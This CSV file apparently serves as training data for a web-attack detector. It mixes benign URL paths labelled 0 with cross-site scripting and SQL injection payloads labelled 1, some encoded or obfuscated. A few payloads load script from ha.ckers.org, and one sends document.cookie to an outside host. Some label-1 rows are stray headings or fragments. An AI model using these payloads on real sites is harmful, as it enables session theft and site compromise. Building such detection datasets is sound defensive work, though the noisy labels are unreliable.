payload,label
/index.php?q=kma167,0
/assets/style.css?token=123712,0
/home?id=admin922,0
/assets/style.css?q=123270,0
/api/v1/users?category=admin933,0
/login.html?category=book349,0
/search?token=book760,0
/login.html?page=admin60,0
/api/v1/users?page=apple477,0
Cross Site Scripting Strings Embed:,1
/product/detail?user=admin922,0
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",1
/product/detail?page=apple445,0
/api/v1/users?token=12350,0
/api/v1/users?q=hải697,0
/assets/style.css?id=2026623,0
/home?q=apple853,0
/api/v1/users?token=hải407,0
/assets/style.css?user=apple375,0
/search?category=contact732,0
"<BR SIZE=""&{alert('XSS')}"">",1
/login.html?category=hải872,0
/home?page=profile928,0
/home?token=profile790,0
/login.html?category=2026163,0
/index.php?q=hải437,0
/search?page=kma74,0
/assets/style.css?q=kma90,0
/product/detail?token=profile220,0
/api/v1/users?q=admin968,0
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
/assets/style.css?id=admin786,0
/api/v1/users?id=kma36,0
/home?token=book160,0
Cross Site Scripting Strings Restriction Bypass Mail:,1
/search?q=apple26,0
&#X03c;,1
/search?page=kma319,0
/login.html?q=hải720,0
/api/v1/users?user=admin328,0
/login.html?category=shoes27,0
/search?q=apple181,0
/home?q=profile922,0
/login.html?user=hải286,0
/search?page=123483,0
/index.php?user=hải606,0
/home?q=hải234,0
/home?token=hải443,0
&#X03C,1
"org/xss.swf"" AllowScriptAccess=""always""></EMBED>",1
/product/detail?id=2026253,0
/product/detail?q=123846,0
/search?id=hải57,0
/api/v1/users?q=hải566,0
/search?page=kma181,0
/login.html?q=123187,0
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
/assets/style.css?user=profile585,0
/login.html?id=admin992,0
/search?user=202619,0
/product/detail?token=admin480,0
/assets/style.css?q=book521,0
"""><h1 ondblclick=prompt(document.domain)>xss by evan</h1>",1
/product/detail?page=book561,0
/login.html?q=123349,0
/index.php?page=apple637,0
' OR 1=1#,1
/assets/style.css?token=123211,0
/assets/style.css?category=contact250,0
/home?user=123462,0
/search?category=profile396,0
/home?q=hải406,0
"<IMG SRC=""jav  ascript:alert('CrossSiteScripting');"">",1
/home?page=2026252,0
"<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:alert('CrossSiteScripting')""></B></I></XML>",1
/assets/style.css?id=2026364,0
/product/detail?q=kma444,0
/assets/style.css?token=202659,0
/login.html?q=kma76,0
/assets/style.css?id=book762,0
/login.html?page=apple893,0
">""<IMG SRC=""  javascript:document.cookie=true;"">",1
/api/v1/users?token=kma12,0
/login.html?q=12378,0
/index.php?category=book354,0
/login.html?page=shoes164,0
/product/detail?user=book803,0
/index.php?page=contact227,0
/index.php?token=apple751,0
/login.html?id=book399,0
/index.php?id=admin726,0
/assets/style.css?q=2026973,0
/index.php?category=kma867,0
<![endif]-->,1
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",1
/search?page=book462,0
/assets/style.css?page=123736,0
/login.html?category=shoes816,0
"<IMG SRC=""jav	ascript:alert('XSS');"">",1
/assets/style.css?page=profile292,0
/home?user=apple748,0
/home?page=2026844,0
/search?user=123222,0
/product/detail?token=kma687,0
/api/v1/users?q=hải623,0
/index.php?id=contact590,0
/search?q=admin418,0
/home?page=shoes827,0
/assets/style.css?id=apple87,0
/home?q=contact764,0
ject data=javascript&colon;\u0061&#x6C;&#101%72t(1)><ob,1
/search?id=apple16,0
/assets/style.css?token=shoes78,0
/index.php?id=profile880,0
/assets/style.css?user=book21,0
/login.html?token=kma138,0
/product/detail?id=hải257,0
/api/v1/users?token=kma995,0
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&oe=CP932,1
/api/v1/users?category=123643,0
/product/detail?page=profile518,0
/product/detail?category=hải545,0
/home?category=profile144,0
/login.html?id=book59,0
/assets/style.css?id=kma492,0
/search?category=123698,0
/index.php?q=apple423,0
/login.html?token=2026346,0
/search?q=contact606,0
/assets/style.css?q=admin545,0
/product/detail?category=contact99,0
/index.php?q=123847,0
/product/detail?id=book19,0
/search?user=book577,0
/home?category=apple27,0
/home?category=profile579,0
/assets/style.css?user=123635,0
/product/detail?page=contact95,0
"-1<FRAMESET><FRAME SRC=""javascript:document.cookie=true;""></FRAMESET>",1
/home?category=kma662,0
/api/v1/users?page=123255,0
/api/v1/users?id=kma83,0
">""<style><!--</style><script>document.cookie=true;//--></script>",1
"<div/onmouseover='alert(1)'> style=""x:"">",1
"”>alert(String.fromCharCode(88,83,83));",1
/search?id=book197,0
/assets/style.css?category=book731,0
/search?q=hải198,0
/api/v1/users?category=2026504,0
"-1<img src=""livescript:document.cookie=true;"">",1
"tt	p://6	6.000146.0x7.147/"">XSS</A>",1
/product/detail?id=shoes522,0
/home?page=123856,0
/login.html?id=hải222,0
</rss>,1
/home?user=123239,0
/index.php?token=apple650,0
/index.php?token=kma153,0
"-1<TABLE BACKGROUND=""javascript:document.cookie=true;"">",1
/index.php?q=admin38,0
/login.html?id=hải889,0
/api/v1/users?page=shoes482,0
/index.php?token=book439,0
/home?id=contact625,0
/product/detail?user=admin943,0
/home?category=kma675,0
/product/detail?id=contact374,0
/index.php?token=kma480,0
/index.php?id=kma524,0
/search?id=kma251,0
/assets/style.css?category=admin241,0
/home?token=shoes379,0
/login.html?category=2026354,0
/assets/style.css?q=kma346,0
/product/detail?page=kma700,0
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
/product/detail?id=profile276,0
/home?id=shoes509,0
/product/detail?token=kma920,0
/search?id=shoes849,0
/assets/style.css?page=shoes1,0
/search?q=2026579,0
/index.php?category=apple493,0
/search?category=apple681,0
/login.html?category=profile304,0
/login.html?token=2026777,0
/index.php?user=admin819,0
">""<div style=""binding: url([link to code]);"">",1
/product/detail?q=123787,0
/assets/style.css?token=kma356,0
/login.html?user=123164,0
/index.php?id=book744,0
/search?user=kma120,0
"""><h1>",1
/search?category=contact789,0
/index.php?category=kma262,0
/login.html?category=book807,0
/login.html?page=2026721,0
/login.html?token=book977,0
/assets/style.css?category=2026386,0
/api/v1/users?token=profile775,0
"<IMG SRC='vbscript:msgbox(""CrossSiteScripting"")'>",1
/product/detail?token=2026863,0
/product/detail?id=profile640,0
""" autofocusonfocus=alert(1)//",1
/api/v1/users?q=123244,0
/index.php?user=hải882,0
/product/detail?q=kma403,0
/login.html?q=123308,0
/login.html?q=apple559,0
/login.html?category=123644,0
/assets/style.css?token=123921,0
/login.html?id=apple513,0
/index.php?id=contact360,0
/assets/style.css?page=book94,0
"-1<BGSOUND SRC=""javascript:document.cookie=true;"">",1
/assets/style.css?page=admin518,0
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1
/assets/style.css?category=profile739,0
/api/v1/users?q=shoes205,0
/home?id=2026903,0
/index.php?q=hải513,0
/index.php?category=20265,0
/login.html?page=2026872,0
/home?page=apple565,0
/assets/style.css?id=contact835,0
/index.php?id=kma487,0
/search?id=contact398,0
/assets/style.css?q=contact573,0
/login.html?token=shoes365,0
/search?id=admin5,0
/home?user=contact555,0
/product/detail?token=hải929,0
/product/detail?q=123336,0
/home?category=hải770,0
/login.html?q=contact773,0
/index.php?token=admin582,0
/home?category=shoes374,0
/search?id=book21,0
/index.php?user=shoes890,0
/login.html?user=shoes583,0
/product/detail?page=book886,0
/search?token=hải118,0
/home?page=book163,0
%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
"<IMG SRC=""jav&#x0A;ascript:alert('CrossSiteScripting');"">",1
/search?category=book574,0
/search?q=contact537,0
/search?user=apple872,0
/assets/style.css?category=123689,0
&#X000003C;,1
/product/detail?id=apple587,0
/login.html?user=book938,0
/login.html?token=hải881,0
/api/v1/users?q=admin913,0
/api/v1/users?category=hải183,0
/index.php?id=shoes32,0
"<DIV STYLE=""width: expression(alert('CrossSiteScripting'));"">",1
/assets/style.css?token=book759,0
/search?token=profile478,0
/api/v1/users?id=admin68,0
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
/home?token=apple8,0
/assets/style.css?user=kma332,0
/assets/style.css?q=hải531,0
/home?q=123644,0
/search?page=contact734,0
/login.html?token=hải997,0
/index.php?category=book247,0
/search?id=book725,0
/login.html?user=123174,0
/api/v1/users?user=kma543,0
/home?id=shoes499,0
/api/v1/users?id=2026866,0
/search?user=admin925,0
<form><button formaction=javascript&colon;alert(/xssbyevan/)>CLICKME,1
/search?q=hải163,0
/product/detail?category=hải996,0
/index.php?token=admin413,0
%3CIFRAME+SRC%3D%22javascript%3Aalert(1)%3B%22%3E%3C%2FIFRAME%3E,1
/assets/style.css?category=hải464,0
/login.html?user=book424,0
/api/v1/users?user=kma958,0
"' GROUP BY 1,2,3--",1
/index.php?q=shoes804,0
/login.html?q=hải712,0
"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",1
/assets/style.css?category=shoes974,0
/assets/style.css?id=shoes658,0
/product/detail?user=hải340,0
/search?page=book398,0
/login.html?token=123158,0
/product/detail?user=apple423,0
/home?id=apple408,0
<q/oncut=alert(1)>,1
/login.html?token=2026698,0
/assets/style.css?user=kma882,0
/api/v1/users?q=apple239,0
/home?q=2026883,0
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
/product/detail?user=book648,0
/home?user=shoes756,0
/search?user=apple312,0
/login.html?q=kma343,0
/home?category=admin455,0
/login.html?id=book408,0
/product/detail?q=123691,0
<a onmouseover=alert(document.cookie)>xxs link</a>,1
/login.html?token=kma512,0
/home?token=hải709,0
/assets/style.css?category=apple284,0
/login.html?q=kma129,0
/api/v1/users?user=123623,0
/api/v1/users?page=admin943,0
/search?user=hải110,0
/login.html?token=123852,0
/api/v1/users?category=2026714,0
/login.html?q=book933,0
/search?q=admin855,0
/index.php?user=2026953,0
/assets/style.css?user=kma447,0
/index.php?token=shoes984,0
/search?user=book794,0
&#x000003C;,1
/login.html?token=shoes507,0
/api/v1/users?category=profile995,0
/index.php?id=admin992,0
/api/v1/users?category=apple142,0
/api/v1/users?token=2026419,0
/assets/style.css?user=hải113,0
/search?id=book261,0
/api/v1/users?q=admin736,0
/api/v1/users?q=contact264,0
/api/v1/users?user=hải230,0
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1
/home?category=123310,0
/api/v1/users?user=123824,0
/product/detail?id=123613,0
/index.php?user=book389,0
">""<IMG SRC=""javascript:document.cookie=true;"">",1
/assets/style.css?category=admin766,0
/api/v1/users?token=contact383,0
&#x03c,1
/login.html?page=profile329,0
/assets/style.css?category=202622,0
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-&oe=Windows-31J,1
/login.html?user=kma84,0
/api/v1/users?token=2026925,0
"width:expression(eval( String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,102,101,114,114,117,104,46,109,97,118,105,116,117,110,97,46,99,111,109,47,120,115,115,47,63,39,43,101,115,99,97,112,101,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)))",1
/login.html?token=admin808,0
/index.php?id=book366,0
/login.html?q=hải775,0
/assets/style.css?user=kma586,0
/index.php?id=profile140,0
/home?token=12388,0
Cross Site Scripting Strings  on per line validation applications:,1
/home?id=admin916,0
/assets/style.css?id=123363,0
/product/detail?page=123514,0
"<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
/api/v1/users?category=hải219,0
/index.php?category=123452,0
/search?token=shoes271,0
/login.html?page=kma833,0
/api/v1/users?category=2026747,0
/search?token=hải437,0
/search?user=apple364,0
/assets/style.css?category=contact933,0
/product/detail?page=shoes874,0
"<xml src=""javascript:document.cookie=true;"">",1
/product/detail?id=contact911,0
/home?user=book152,0
/api/v1/users?page=book65,0
/index.php?page=admin852,0
/login.html?page=123557,0
/api/v1/users?page=book543,0
/product/detail?user=contact767,0
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,1
/assets/style.css?q=12319,0
/product/detail?page=contact111,0
/product/detail?user=book373,0
\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//,1
/home?token=hải460,0
/product/detail?token=kma472,0
/product/detail?id=shoes253,0
"""><iframe onclick=alert(Evan)></iframe>",1
/api/v1/users?id=book763,0
/search?q=kma917,0
/index.php?category=2026940,0
/assets/style.css?q=admin849,0
/home?category=book213,0
"<STYLE>.CrossSiteScripting{background-image:url(""javascript:alert('CrossSiteScripting')"");}</STYLE><A CLASS=CrossSiteScripting></A>",1
/index.php?category=2026656,0
"-1<IMG SRC=""  javascript:document.cookie=true;"">",1
/api/v1/users?category=profile218,0
'OR%0a1=1--,1
/home?user=book198,0
/product/detail?category=admin237,0
/api/v1/users?token=kma109,0
/api/v1/users?page=contact35,0
/api/v1/users?category=admin316,0
">""<INPUT TYPE=""IMAGE"" SRC=""javascript:document.cookie=true;"">",1
/search?category=contact882,0
/product/detail?q=apple650,0
/assets/style.css?q=book86,0
/assets/style.css?category=profile550,0
/product/detail?category=apple15,0
/home?category=book117,0
/home?user=book78,0
</title><!-- --><body onload=alert(1);></iframe src=http://google.com>-->,1
"""><IMG SRC=""jav	ascript:alert(document.cookie);"">",1
/home?token=kma637,0
/login.html?q=book575,0
/api/v1/users?user=kma800,0
/search?user=contact866,0
/home?page=2026337,0
/home?id=admin37,0
/product/detail?category=contact342,0
/product/detail?token=kma807,0
/index.php?token=2026895,0
/home?page=admin682,0
/home?q=apple773,0
/assets/style.css?user=contact536,0
/api/v1/users?page=123387,0
/assets/style.css?id=profile409,0
/home?id=kma677,0
/login.html?token=2026532,0
/index.php?page=book692,0
/index.php?page=profile686,0
"<img src=x onerror=""javascript:window.onerror=alert;throw 1"">",1
<img/src='x'/onerror='alert(1)'/>,1
/login.html?user=hải263,0
/search?token=book758,0
/index.php?id=123627,0
/product/detail?category=kma586,0
/product/detail?id=book365,0
/home?page=book209,0
-1&<script>document.cookie=true;</script>,1
/search?q=admin573,0
/assets/style.css?token=hải288,0
/login.html?page=kma986,0
/login.html?user=2026190,0
/login.html?q=book935,0
/index.php?id=book818,0
/product/detail?token=2026251,0
/home?user=profile456,0
/search?id=contact819,0
/assets/style.css?user=2026260,0
/api/v1/users?token=profile659,0
<<script>document.cookie=true;</script>,1
/home?user=hải627,0
/assets/style.css?user=apple642,0
/product/detail?id=shoes736,0
/search?user=shoes291,0
/search?token=apple808,0
/assets/style.css?token=kma192,0
/index.php?category=book157,0
">""<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-",1
/search?category=123548,0
/index.php?page=contact101,0
/product/detail?token=hải62,0
/product/detail?token=2026330,0
/search?page=apple74,0
"""><tetxarea></script><img src=1 onerror=alert(document.cookie);>",1
"-1<CrossSiteScripting STYLE=""CrossSiteScripting:expression(document.cookie=true)"">",1
/product/detail?user=book274,0
/index.php?category=shoes800,0
/assets/style.css?category=contact220,0
/assets/style.css?category=admin676,0
/home?page=kma394,0
/home?category=kma522,0
<select autofocus onfocus=alert(1)>,1
/assets/style.css?token=202671,0
&#X0003C,1
/assets/style.css?id=kma424,0
/login.html?page=hải28,0
/api/v1/users?token=admin77,0
/index.php?q=admin259,0
/assets/style.css?q=shoes982,0
/index.php?q=admin420,0
/login.html?page=profile36,0
/search?q=contact816,0
/index.php?page=shoes438,0
/index.php?q=2026875,0
/home?token=profile617,0
/login.html?token=profile322,0
">""<img src=""blah>"" onmouseover=""document.cookie=true;"">",1
</plaintext\></|\><plaintext/onmouseover=prompt(1),1
/home?page=123209,0
/index.php?id=kma895,0
/search?user=apple177,0
/assets/style.css?user=123983,0
/home?user=123410,0
/product/detail?q=admin882,0
/search?page=profile257,0
/search?category=hải21,0
"<BR SIZE=""&{alert('CrossSiteScripting')}"">",1
/assets/style.css?token=kma70,0
/login.html?q=kma345,0
/index.php?id=hải65,0
%002f%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e,1
/index.php?user=kma618,0
/search?token=book332,0
/assets/style.css?page=202628,0
/product/detail?q=shoes961,0
/home?user=apple640,0
/api/v1/users?user=hải191,0
/assets/style.css?id=hải863,0
/product/detail?page=admin273,0
/home?category=2026560,0
/product/detail?page=apple725,0
/search?category=kma265,0
